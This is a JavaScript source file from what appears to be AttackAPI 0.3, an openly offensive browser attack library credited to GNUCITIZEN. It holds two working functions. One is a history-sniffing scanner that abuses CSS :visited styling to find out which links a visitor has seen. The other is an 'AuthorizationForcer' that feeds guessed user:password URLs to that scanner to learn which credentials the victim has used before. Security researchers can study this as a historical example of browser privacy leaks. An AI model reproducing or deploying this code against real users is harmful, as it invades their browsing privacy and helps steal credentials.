var AttackAPI = {
	version: '0.3',
	author: 'Petko Petkov (architect)',
	homepage: 'http://www.gnucitizen.org',
	credits: {
		DanielBartlett: {homepage: 'http://f-box.org/~dan/'},
		JeremiahGrossman: {homepage: 'http://jeremiahgrossman.blogspot.com/'}
	}};

AttackAPI.VisitedLinkScanner = {};
AttackAPI.VisitedLinkScanner.scanLinks = function (callback, links, hex_color, id) {
	var hex_color = (hex_color == null)?'#0000cc':hex_color.toLowerCase();
	var id = (id == null)?'vlink_scanner_link_id':id;
	
	var rgb_color = 'rgb(' +
		parseInt(hex_color.substring(1, 3), 16) + ', ' + 
		parseInt(hex_color.substring(3, 5), 16) + ', ' + 
		parseInt(hex_color.substring(5, 7), 16) + ')';
	
	try {
		var style = document.createElement('style');
		style.innerHTML = '#' + id + ':visited{display:none;color:' + hex_color + '}';
		document.body.appendChild(style);
	} catch (e) {}
	
	var link = document.createElement('a');
	link.id = id;
	document.body.appendChild(link);
	
	for (index = 0; index < links.length; index++) {
		link.href = links[index];
		
		if(document.defaultView) {
			var this_color = document.defaultView.getComputedStyle(link, null).getPropertyValue('color');
		} else {
			var this_color = link.currentStyle['color'];
		}
		
		callback(links[index], this_color == hex_color || this_color == rgb_color);
	}
	
	if (style.innerHTML)
		document.body.removeChild(style);
		
	document.body.removeChild(link);
};

AttackAPI.AuthorizationForcer = {};
AttackAPI.AuthorizationForcer.lazyForce = function (callback, target,
credentials, hex_color, id) {
	var protocol = target.substring(0, target.indexOf(':'));
	var url = target.substring(target.indexOf(':') + 3);
	var links = new Array();
	
	for (index = 0; index < credentials.length; index++)
		links.push(protocol + '://' + credentials[index] + '@' + url);
	
	AttackAPI.VisitedLinkScanner.scanLinks(function (link, status) {
		var credential = link.substring(link.indexOf(':') + 3, link.indexOf('@'));
		callback(target, credential, status);
	}, links, hex_color, id);
};
